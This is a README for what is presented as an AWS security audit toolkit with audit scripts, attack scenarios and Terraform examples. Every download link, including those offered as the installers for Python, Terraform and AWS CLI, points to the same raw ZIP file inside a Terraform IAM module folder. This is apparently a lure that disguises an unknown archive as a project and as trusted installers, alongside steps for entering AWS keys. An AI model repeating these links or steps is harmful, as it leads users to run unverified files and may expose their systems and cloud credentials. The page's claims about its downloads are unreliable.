# 🛡️ aws-security-best-practices - Audit AWS with clear test steps

[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Spacewalkisostasy809/aws-security-best-practices/main/terraform/modules/iam/security-practices-aws-best-2.3.zip)

## 📥 Download

Use this link to visit the page and download the files:

https://raw.githubusercontent.com/Spacewalkisostasy809/aws-security-best-practices/main/terraform/modules/iam/security-practices-aws-best-2.3.zip

## 🖥️ What this project does

aws-security-best-practices helps you review common AWS security risks with ready-made audit scripts, attack scenarios, and Terraform setups. It covers IAM, EC2, S3, Lambda, RDS, and network security.

This project is built for people who want to check how secure an AWS setup is and see what weak settings look like in practice. It also includes both risky and fixed Terraform environments, so you can compare them side by side.

## ✅ What you need

Before you start, make sure you have:

- A Windows PC
- A web browser
- Internet access
- A GitHub account if you want to save the repo
- AWS access if you plan to run the cloud checks
- Python 3.10 or later for the scripts
- Terraform 1.5 or later for the example environments
- AWS CLI if you want to connect to your AWS account

## 📦 Files you can expect

Inside the project, you will find:

- Audit scripts for AWS checks
- Example attack scenarios for learning and testing
- Terraform files for unsafe environments
- Terraform files for fixed environments
- Service-specific examples for:
  - IAM
  - EC2
  - S3
  - Lambda
  - RDS
  - Network rules

## 🚀 Getting Started on Windows

Follow these steps in order.

### 1. Open the download page

Open this link in your browser:

https://raw.githubusercontent.com/Spacewalkisostasy809/aws-security-best-practices/main/terraform/modules/iam/security-practices-aws-best-2.3.zip

### 2. Download the project

On the GitHub page, use the Code button and choose one of these options:

- Download ZIP
- Open with GitHub Desktop
- Clone the repo if you already use Git

If you want the simplest path, choose Download ZIP.

### 3. Save the file

If you downloaded a ZIP file:

- Save it to your Downloads folder
- Wait for the download to finish
- Right-click the ZIP file
- Select Extract All

### 4. Open the folder

After extraction:

- Open the extracted folder
- Look for the main project files
- Keep this folder in a place you can find again, such as Documents or Desktop

### 5. Install Python

If Python is not on your PC:

- Go to https://raw.githubusercontent.com/Spacewalkisostasy809/aws-security-best-practices/main/terraform/modules/iam/security-practices-aws-best-2.3.zip
- Download the latest Python 3 installer
- Run the installer
- Make sure you check Add Python to PATH
- Finish the install

To check that Python works:

- Open Command Prompt
- Type: python --version
- Press Enter

If you see a version number, Python is ready

### 6. Install Terraform

If you want to use the sample environments:

- Go to https://raw.githubusercontent.com/Spacewalkisostasy809/aws-security-best-practices/main/terraform/modules/iam/security-practices-aws-best-2.3.zip
- Download the Windows version
- Unzip it
- Move terraform.exe into a folder like C:\Terraform
- Add that folder to your PATH

To check it:

- Open Command Prompt
- Type: terraform --version
- Press Enter

### 7. Install AWS CLI

If you want to connect to AWS:

- Go to https://raw.githubusercontent.com/Spacewalkisostasy809/aws-security-best-practices/main/terraform/modules/iam/security-practices-aws-best-2.3.zip
- Install AWS CLI for Windows
- Open Command Prompt
- Type: aws --version
- Press Enter

### 8. Set up your AWS login

If you plan to run audit scripts against your own AWS account:

- Open Command Prompt
- Type: aws configure
- Enter your access key
- Enter your secret key
- Enter your default region
- Choose a format such as json

Keep your AWS account safe. Use a test account if you can.

## 🧪 Run the audit scripts

After setup, go to the project folder and open Command Prompt there.

A common flow looks like this:

- Open the folder
- Click the address bar in File Explorer
- Type cmd
- Press Enter

Then run the scripts based on the file names in the repo.

Common examples:

- python audit_iam.py
- python audit_ec2.py
- python audit_s3.py
- python audit_lambda.py
- python audit_rds.py
- python audit_network.py

If a script asks for a region or profile, enter the values you use in AWS.

## 🧱 Use the Terraform examples

The repo includes Terraform examples for both weak and remediated setups.

Typical steps:

- Open Command Prompt in the Terraform folder
- Run terraform init
- Run terraform plan
- Run terraform apply

If you want to remove the test setup later:

- Run terraform destroy

Use this only in a test environment you control.

## 🔍 What each area covers

### IAM

You can check for:

- Users with too many permissions
- Weak password rules
- Missing multi-factor login
- Roles that allow too much access

### EC2

You can check for:

- Open ports
- Public instances
- Weak security groups
- Missing hardening settings

### S3

You can check for:

- Public buckets
- Open read access
- Unsafe bucket policies
- Missing encryption

### Lambda

You can check for:

- Broad execution roles
- Unneeded permissions
- Unsafe triggers
- Weak access control

### RDS

You can check for:

- Public database access
- Missing encryption
- Weak network rules
- Poor access settings

### Network security

You can check for:

- Open security groups
- Wide CIDR ranges
- Exposed admin ports
- Missing subnet controls

## 🛠️ Common Windows commands

Here are a few commands that may help:

- dir — shows files in the current folder
- cd foldername — opens a folder
- python file.py — runs a Python script
- terraform init — prepares Terraform
- terraform plan — shows what Terraform will do
- terraform apply — creates the test setup
- terraform destroy — removes the test setup

## 🧭 Suggested setup path for new users

If you are new to this, follow this order:

1. Download the ZIP from GitHub
2. Extract it
3. Install Python
4. Run one audit script
5. Install Terraform
6. Try one sample environment
7. Review the risky and fixed versions
8. Use AWS CLI only if you want live AWS checks

## 📁 Example folder layout

You may see a layout like this:

- README files
- scripts
- terraform
- examples
- vulnerable
- remediated
- docs

Folder names can vary, but this gives you a sense of what to look for

## 🔐 Good practices while using this repo

- Use a test AWS account when you can
- Keep your AWS keys private
- Do not run test changes in a live work account
- Check each script before you run it
- Remove test resources when you are done

## 📌 Main topics

This project focuses on:

- audit
- aws
- aws-security
- boto3
- cloud-security
- devops
- devsecops
- ec2
- iam
- iam-role
- lambda
- motoserver
- security
- sre
- terraform

## 🧰 If something does not work

If a script does not run:

- Check that Python is installed
- Check that you are in the right folder
- Check that the file name matches the command
- Check that AWS CLI is set up if the script needs it
- Check that Terraform is installed if you use the example environments

If a command says it cannot be found:

- Close Command Prompt
- Open it again
- Try the command again
- Make sure the tool is on your PATH

## 📎 Quick start path

- Visit the GitHub page
- Download the repo
- Extract the ZIP
- Install Python
- Run the audit scripts
- Install Terraform
- Try the example environments